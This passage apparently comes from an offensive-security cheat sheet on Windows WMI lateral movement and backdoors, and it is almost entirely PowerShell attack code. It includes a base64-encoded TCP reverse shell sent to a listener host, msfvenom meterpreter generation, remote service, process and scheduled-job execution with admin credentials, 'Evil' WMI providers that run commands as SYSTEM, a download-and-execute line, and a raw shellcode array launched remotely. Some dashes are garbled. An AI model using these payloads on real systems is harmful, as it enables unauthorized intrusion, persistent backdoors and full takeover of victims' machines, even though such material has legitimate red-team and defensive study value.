</span></span><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Name</span> <span class=n>Create</span> <span class=n>-ArgumentList</span> <span class=vm>$False</span><span class=p>,</span><span class=s2>&#34;Windows Performance&#34;</span><span class=p>,</span><span class=nv>$ErrorControl</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=s2>&#34;WinPerf&#34;</span><span class=p>,</span><span class=s2>&#34;c:\Windows\System32\cmd.exe /c powershell -e </span><span class=nv>$EncodedShell</span><span class=s2>&#34;</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=nv>$ServiceType</span><span class=p>,</span><span class=s2>&#34;Manual&#34;</span><span class=p>,</span><span class=s2>&#34;NT AUTHORITY\SYSTEM&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;10.10.10.10&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\Administrator&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Filter</span> <span class=s1>&#39;Name = &#34;WinPerf&#34;&#39;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;10.10.10.10&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\Administrator&#34;</span> <span class=p>|</span> <span class=nb>Invoke-WmiMethod</span> <span class=n>-Name</span> <span class=n>StartService</span>
</span></span></code></pre></div><p>Get a reverse shell using <a href=https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process target=_blank rel=noopener>Win32_Process</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># On the local machine it is necessary to open a listener using powercat</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=n>powercat</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-v</span> <span class=n>-p</span> <span class=mf>8080</span> <span class=n>-t</span> <span class=mf>10000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Create the base64-encoded reverse shell (command to be executed with powershell -e $EncodedShell)</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=p>=</span> <span class=s2>&#34;10.10.10.2&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$port</span> <span class=p>=</span> <span class=mf>8080</span>
</span></span><span class=line><span class=cl><span class=nv>$Shell</span> <span class=p>=</span> <span class=s1>&#39;$client = New-Object System.Net.Sockets.TCPClient(&#34;&#39;</span> <span class=p>+</span> <span class=nv>$ip</span> <span class=p>+</span> <span class=s1>&#39;&#34;,&#39;</span> <span class=p>+</span> <span class=nv>$port</span> <span class=p>+</span> <span class=s1>&#39;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;</span>
</span></span><span class=line><span class=cl><span class=nv>$EncodedShell</span> <span class=p>=[</span><span class=no>Convert</span><span class=p>]::</span><span class=n>ToBase64String</span><span class=p>([</span><span class=no>System.Text.Encoding</span><span class=p>]::</span><span class=n>Unicode</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$Shell</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># You can also use msfvenom to generate the base64-encoded reverse shell</span>
</span></span><span class=line><span class=cl><span class=n>msfvenom</span> <span class=err>â€“</span><span class=n>payload</span> <span class=n>windows</span><span class=p>/</span><span class=n>meterpreter</span><span class=p>/</span><span class=n>reverse_tcp</span> <span class=n>LHOST</span><span class=p>=</span><span class=mf>10.10</span><span class=p>.</span><span class=py>10</span><span class=p>.</span><span class=py>2</span> <span class=n>LPORT</span><span class=p>=</span><span class=mf>8080</span> <span class=err>â€“</span><span class=n>format</span> <span class=n>psh</span> <span class=err>â€“</span><span class=n>smallest</span> <span class=p>|</span> <span class=n>msfvenom</span> <span class=err>â€“</span><span class=n>payload</span> <span class=err>â€“</span> <span class=err>â€“</span><span class=n>platform</span> <span class=n>win</span> <span class=err>â€“</span><span class=n>arch</span> <span class=n>x86</span> <span class=err>â€“</span><span class=n>encoder</span> <span class=n>base64</span> <span class=n>NOEXIT</span> <span class=n>SYSWOW64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Execute the process</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Class</span> <span class=n>Win32_Process</span> <span class=n>-Name</span> <span class=n>Create</span> <span class=n>-ArgumentList</span> <span class=s2>&#34;c:\Windows\System32\cmd.exe /c powershell -e </span><span class=nv>$EncodedShell</span><span class=s2>&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;10.10.10.10&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\Administrator&#34;</span>
</span></span></code></pre></div><p>Get a reverse shell using <a href=https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-scheduledjob target=_blank rel=noopener>Win32_ScheduledJob</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># On the local machine it is necessary to open a listener using powercat</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=n>powercat</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-v</span> <span class=n>-p</span> <span class=mf>8080</span> <span class=n>-t</span> <span class=mf>10000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Create the base64-encoded reverse shell (command to be executed with powershell -e $EncodedShell)</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=p>=</span> <span class=s2>&#34;10.10.10.2&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$port</span> <span class=p>=</span> <span class=mf>8080</span>
</span></span><span class=line><span class=cl><span class=nv>$Shell</span> <span class=p>=</span> <span class=s1>&#39;$client = New-Object System.Net.Sockets.TCPClient(&#34;&#39;</span> <span class=p>+</span> <span class=nv>$ip</span> <span class=p>+</span> <span class=s1>&#39;&#34;,&#39;</span> <span class=p>+</span> <span class=nv>$port</span> <span class=p>+</span> <span class=s1>&#39;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;</span>
</span></span><span class=line><span class=cl><span class=nv>$EncodedShell</span> <span class=p>=[</span><span class=no>Convert</span><span class=p>]::</span><span class=n>ToBase64String</span><span class=p>([</span><span class=no>System.Text.Encoding</span><span class=p>]::</span><span class=n>Unicode</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$Shell</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># You can also use msfvenom to generate the base64-encoded reverse shell</span>
</span></span><span class=line><span class=cl><span class=n>msfvenom</span> <span class=err>â€“</span><span class=n>payload</span> <span class=n>windows</span><span class=p>/</span><span class=n>meterpreter</span><span class=p>/</span><span class=n>reverse_tcp</span> <span class=n>LHOST</span><span class=p>=</span><span class=mf>10.10</span><span class=p>.</span><span class=py>10</span><span class=p>.</span><span class=py>2</span> <span class=n>LPORT</span><span class=p>=</span><span class=mf>8080</span> <span class=err>â€“</span><span class=n>format</span> <span class=n>psh</span> <span class=err>â€“</span><span class=n>smallest</span> <span class=p>|</span> <span class=n>msfvenom</span> <span class=err>â€“</span><span class=n>payload</span> <span class=err>â€“</span> <span class=err>â€“</span><span class=n>platform</span> <span class=n>win</span> <span class=err>â€“</span><span class=n>arch</span> <span class=n>x86</span> <span class=err>â€“</span><span class=n>encoder</span> <span class=n>base64</span> <span class=n>NOEXIT</span> <span class=n>SYSWOW64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Execute the process at 7:52pm </span>
</span></span><span class=line><span class=cl><span class=nv>$wmi_sched_job</span> <span class=p>=</span> <span class=p>[</span><span class=no>wmiclass</span><span class=p>]</span><span class=s2>&#34;\\</span><span class=nv>$env:computername</span><span class=s2>\root\cimv2:win32_scheduledjob&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$time</span> <span class=p>=</span> <span class=nv>$wmi_sched_job</span><span class=p>.</span><span class=py>ConvertFromDateTime</span><span class=p>(</span><span class=s2>&#34;7:52pm&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nv>$task</span> <span class=p>=</span> <span class=s2>&#34;c:\Windows\System32\cmd.exe /c powershell -e </span><span class=nv>$EncodedShell</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>Get-WmiObject</span> <span class=n>-List</span> <span class=n>win32_scheduledjob</span> <span class=n>-ComputerName</span> <span class=s2>&#34;10.10.10.10&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\Administrator&#34;</span><span class=p>).</span><span class=py>Create</span><span class=p>(</span><span class=nv>$task</span><span class=p>,</span><span class=nv>$time</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=backdoors---custom-wmi-provider>Backdoors - Custom WMI Provider</h3><p>WMI procides ample opportunities to backdoor a machine.</p><p><a href=https://github.com/rzander/LocalAdmins target=_blank rel=noopener>Win32_LocalAdmins</a> provider creates a class called Win32_LocalAdmins in the <code>root\cimv2</code> namespace which can be used to list all local administrators.</p><p><a href=https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider target=_blank rel=noopener>Evil Network Connection WMI Provider</a> provides ability to execute Powershell command with SYSTEM privileges. It needs elevated privileges to be installed. Powershell.exe in not used to execute the payload.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Install Provider</span>
</span></span><span class=line><span class=cl><span class=nb>cd </span><span class=p>&lt;</span><span class=n>downloadpath</span><span class=p>&gt;\</span><span class=nb>EvilNetConnectionWMIProvider-master</span><span class=p>\</span><span class=n>EvilNetConnectionWMIProvider</span><span class=p>\</span><span class=n>bin</span><span class=p>\</span><span class=n>Debug</span>
</span></span><span class=line><span class=cl><span class=p>.\</span><span class=n>InstallUtil</span><span class=p>.</span><span class=py>exe</span> <span class=p>/</span><span class=n>i</span> <span class=n>EvilNetConnectionWMIProvider</span><span class=p>.</span><span class=py>dll</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Uninstall Provider</span>
</span></span><span class=line><span class=cl><span class=nb>cd </span><span class=p>&lt;</span><span class=n>downloadpath</span><span class=p>&gt;\</span><span class=nb>EvilNetConnectionWMIProvider-master</span><span class=p>\</span><span class=n>EvilNetConnectionWMIProvider</span><span class=p>\</span><span class=n>bin</span><span class=p>\</span><span class=n>Debug</span>
</span></span><span class=line><span class=cl><span class=n>Uninstall</span> <span class=s2>&#34;InstallUtil.exe /u EvilNetConnectionWMIProvider.dll&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Query network connections (netstat)</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WMIObject</span> <span class=n>Win32_NetConnection</span> <span class=p>|</span> <span class=nb>select </span><span class=n>LocalAddress</span><span class=p>,</span> <span class=n>LocalPort</span><span class=p>,</span> <span class=n>RemoteAddress</span><span class=p>,</span> <span class=n>RemotePort</span><span class=p>,</span> <span class=n>Protocol</span><span class=p>,</span> <span class=n>State</span> <span class=p>|</span> <span class=nb>ft </span><span class=n>-AutoSize</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Execute arbitrary Powershell ss SYSTEM</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WMIMethod</span> <span class=n>-Class</span> <span class=n>Win32_NetConnection</span> <span class=n>-Name</span> <span class=n>RunPs</span> <span class=n>-ArgumentList</span> <span class=s2>&#34;whoami&#34;</span><span class=p>,</span> <span class=vm>$NULL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WMIMethod</span> <span class=n>-Class</span> <span class=n>Win32_NetConnection</span> <span class=n>-Name</span> <span class=n>RunPs</span> <span class=n>-ArgumentList</span> <span class=s2>&#34;Get-Process&#34;</span><span class=p>,</span> <span class=vm>$NULL</span>
</span></span></code></pre></div><p>Of course, these methods can be invoked from a remote box using <code>-ComputerName</code> and <code>-Credential</code> parameters, but we still need admin privs on the target box.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Query network connections (netstat)</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WMIObject</span> <span class=n>Win32_NetConnection</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\Administrator&#34;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>LocalAddress</span><span class=p>,</span> <span class=n>LocalPort</span><span class=p>,</span> <span class=n>RemoteAddress</span><span class=p>,</span> <span class=n>RemotePort</span><span class=p>,</span> <span class=n>Protocol</span><span class=p>,</span> <span class=n>State</span> <span class=p>|</span> <span class=nb>ft </span><span class=n>-AutoSize</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Execute arbitrary Powershell as SYSTEM </span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WMIMethod</span> <span class=n>-Class</span> <span class=n>Win32_NetConnection</span> <span class=n>-Name</span> <span class=n>RunPs</span> <span class=n>-ArgumentList</span> <span class=s2>&#34;whoami&#34;</span><span class=p>,</span> <span class=vm>$NULL</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\Administrator&#34;</span> 
</span></span><span class=line><span class=cl><span class=nb>Invoke-WMIMethod</span> <span class=n>-Class</span> <span class=n>Win32_NetConnection</span> <span class=n>-Name</span> <span class=n>RunPs</span> <span class=n>-ArgumentList</span> <span class=s2>&#34;Get-Process&#34;</span><span class=p>,</span> <span class=vm>$NULL</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\Administrator&#34;</span> 
</span></span><span class=line><span class=cl><span class=nb>Invoke-WMIMethod</span> <span class=n>-Class</span> <span class=n>Win32_NetConnection</span> <span class=n>-Name</span> <span class=n>RunPs</span> <span class=n>-ArgumentList</span> <span class=s2>&#34;powershell -e </span><span class=nv>$EncodedShell</span><span class=s2>&#34;</span><span class=p>,</span> <span class=vm>$NULL</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\Administrator&#34;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Execute a Powershell script as SYSTEM </span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WMIMethod</span> <span class=n>-Class</span> <span class=n>Win32_NetConnection</span> <span class=n>-Name</span> <span class=n>RunPs</span> <span class=n>-ArgumentList</span> <span class=s2>&#34;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.2/script.ps1&#39;)&#34;</span><span class=p>,</span> <span class=vm>$NULL</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\Administrator&#34;</span> 
</span></span></code></pre></div><p><a href=https://gist.github.com/TheWover/4272ea5829d7f6b22fadaeb8aee3229a target=_blank rel=noopener>Evil WMI Provider</a> can be used to launch custom shellcode on a target box:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Class</span> <span class=n>Win32_Evil</span> <span class=n>-Name</span> <span class=n>ExecShellcode</span> <span class=n>-ArgumentList</span> <span class=vm>@</span><span class=p>(</span><span class=n>0x90</span><span class=p>,</span><span class=n>0x90</span><span class=p>,</span><span class=n>0x90</span><span class=p>),</span> <span class=vm>$NULL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>cimv2</span> <span class=n>-Class</span> <span class=n>Win32_Evil</span> <span class=n>-Name</span> <span class=n>ExecShellCalcCode</span> <span class=n>-ArgumentList</span> <span class=vm>$null</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span><span class=nv>$sc</span> <span class=p>=</span>  <span class=vm>@</span><span class=p>(</span><span class=n>0xfc</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x83</span><span class=p>,</span><span class=n>0xe4</span><span class=p>,</span><span class=n>0xf0</span><span class=p>,</span><span class=n>0xe8</span><span class=p>,</span><span class=n>0xc0</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x51</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x50</span><span class=p>,</span><span class=n>0x52</span><span class=p>,</span><span class=n>0x51</span><span class=p>,</span><span class=n>0x56</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x31</span><span class=p>,</span><span class=n>0xd2</span><span class=p>,</span><span class=n>0x65</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x52</span><span class=p>,</span><span class=n>0x60</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x52</span><span class=p>,</span><span class=n>0x18</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x52</span><span class=p>,</span><span class=n>0x20</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x72</span><span class=p>,</span><span class=n>0x50</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x0f</span><span class=p>,</span><span class=n>0xb7</span><span class=p>,</span><span class=n>0x4a</span><span class=p>,</span><span class=n>0x4a</span><span class=p>,</span><span class=n>0x4d</span><span class=p>,</span><span class=n>0x31</span><span class=p>,</span><span class=n>0xc9</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x31</span><span class=p>,</span><span class=n>0xc0</span><span class=p>,</span><span class=n>0xac</span><span class=p>,</span><span class=n>0x3c</span><span class=p>,</span><span class=n>0x61</span><span class=p>,</span><span class=n>0x7c</span><span class=p>,</span><span class=n>0x02</span><span class=p>,</span><span class=n>0x2c</span><span class=p>,</span><span class=n>0x20</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0xc1</span><span class=p>,</span><span class=n>0xc9</span><span class=p>,</span><span class=n>0x0d</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0xc1</span><span class=p>,</span><span class=n>0xe2</span><span class=p>,</span><span class=n>0xed</span><span class=p>,</span><span class=n>0x52</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x51</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x52</span><span class=p>,</span><span class=n>0x20</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x42</span><span class=p>,</span><span class=n>0x3c</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0xd0</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x80</span><span class=p>,</span><span class=n>0x88</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x85</span><span class=p>,</span><span class=n>0xc0</span><span class=p>,</span><span class=n>0x74</span><span class=p>,</span><span class=n>0x67</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0xd0</span><span class=p>,</span><span class=n>0x50</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x18</span><span class=p>,</span><span class=n>0x44</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x40</span><span class=p>,</span><span class=n>0x20</span><span class=p>,</span><span class=n>0x49</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0xd0</span><span class=p>,</span><span class=n>0xe3</span><span class=p>,</span><span class=n>0x56</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0xff</span><span class=p>,</span><span class=n>0xc9</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x34</span><span class=p>,</span><span class=n>0x88</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0xd6</span><span class=p>,</span><span class=n>0x4d</span><span class=p>,</span><span class=n>0x31</span><span class=p>,</span><span class=n>0xc9</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x31</span><span class=p>,</span><span class=n>0xc0</span><span class=p>,</span><span class=n>0xac</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0xc1</span><span class=p>,</span><span class=n>0xc9</span><span class=p>,</span><span class=n>0x0d</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0xc1</span><span class=p>,</span><span class=n>0x38</span><span class=p>,</span><span class=n>0xe0</span><span class=p>,</span><span class=n>0x75</span><span class=p>,</span><span class=n>0xf1</span><span class=p>,</span><span class=n>0x4c</span><span class=p>,</span><span class=n>0x03</span><span class=p>,</span><span class=n>0x4c</span><span class=p>,</span><span class=n>0x24</span><span class=p>,</span><span class=n>0x08</span><span class=p>,</span><span class=n>0x45</span><span class=p>,</span><span class=n>0x39</span><span class=p>,</span><span class=n>0xd1</span><span class=p>,</span><span class=n>0x75</span><span class=p>,</span><span class=n>0xd8</span><span class=p>,</span><span class=n>0x58</span><span class=p>,</span><span class=n>0x44</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x40</span><span class=p>,</span><span class=n>0x24</span><span class=p>,</span><span class=n>0x49</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0xd0</span><span class=p>,</span><span class=n>0x66</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x0c</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x44</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x40</span><span class=p>,</span><span class=n>0x1c</span><span class=p>,</span><span class=n>0x49</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0xd0</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x04</span><span class=p>,</span><span class=n>0x88</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0xd0</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x58</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x58</span><span class=p>,</span><span class=n>0x5e</span><span class=p>,</span><span class=n>0x59</span><span class=p>,</span><span class=n>0x5a</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x58</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x59</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x5a</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x83</span><span class=p>,</span><span class=n>0xec</span><span class=p>,</span><span class=n>0x20</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x52</span><span class=p>,</span><span class=n>0xff</span><span class=p>,</span><span class=n>0xe0</span><span class=p>,</span><span class=n>0x58</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x59</span><span class=p>,</span><span class=n>0x5a</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x12</span><span class=p>,</span><span class=n>0xe9</span><span class=p>,</span><span class=n>0x57</span><span class=p>,</span><span class=n>0xff</span><span class=p>,</span><span class=n>0xff</span><span class=p>,</span><span class=n>0xff</span><span class=p>,</span><span class=n>0x5d</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0xba</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x8d</span><span class=p>,</span><span class=n>0x8d</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0x01</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0xba</span><span class=p>,</span><span class=n>0x31</span><span class=p>,</span><span class=n>0x8b</span><span class=p>,</span><span class=n>0x6f</span><span class=p>,</span><span class=n>0x87</span><span class=p>,</span><span class=n>0xff</span><span class=p>,</span><span class=n>0xd5</span><span class=p>,</span><span class=n>0xbb</span><span class=p>,</span><span class=n>0xe0</span><span class=p>,</span><span class=n>0x1d</span><span class=p>,</span><span class=n>0x2a</span><span class=p>,</span><span class=n>0x0a</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0xba</span><span class=p>,</span><span class=n>0xa6</span><span class=p>,</span><span class=n>0x95</span><span class=p>,</span><span class=n>0xbd</span><span class=p>,</span><span class=n>0x9d</span><span class=p>,</span><span class=n>0xff</span><span class=p>,</span><span class=n>0xd5</span><span class=p>,</span><span class=n>0x48</span><span class=p>,</span><span class=n>0x83</span><span class=p>,</span><span class=n>0xc4</span><span class=p>,</span><span class=n>0x28</span><span class=p>,</span><span class=n>0x3c</span><span class=p>,</span><span class=n>0x06</span><span class=p>,</span><span class=n>0x7c</span><span class=p>,</span><span class=n>0x0a</span><span class=p>,</span><span class=n>0x80</span><span class=p>,</span><span class=n>0xfb</span><span class=p>,</span><span class=n>0xe0</span><span class=p>,</span><span class=n>0x75</span><span class=p>,</span><span class=n>0x05</span><span class=p>,</span><span class=n>0xbb</span><span class=p>,</span><span class=n>0x47</span><span class=p>,</span><span class=n>0x13</span><span class=p>,</span><span class=n>0x72</span><span class=p>,</span><span class=n>0x6f</span><span class=p>,</span><span class=n>0x6a</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x59</span><span class=p>,</span><span class=n>0x41</span><span class=p>,</span><span class=n>0x89</span><span class=p>,</span><span class=n>0xda</span><span class=p>,</span><span class=n>0xff</span><span class=p>,</span><span class=n>0xd5</span><span class=p>,</span><span class=n>0x63</span><span class=p>,</span><span class=n>0x61</span><span class=p>,</span><span class=n>0x6c</span><span class=p>,</span><span class=n>0x63</span><span class=p>,</span><span class=n>0x00</span> <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>cimv2</span> <span class=n>-Class</span> <span class=n>Win32_Evil</span> <span class=n>-Name</span> <span class=n>ExecShellCode</span> <span class=n>-ArgumentList</span> <span class=nv>$sc</span><span class=p>,</span> <span class=vm>$null</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYEBRLAB\Administrator&#34;</span>
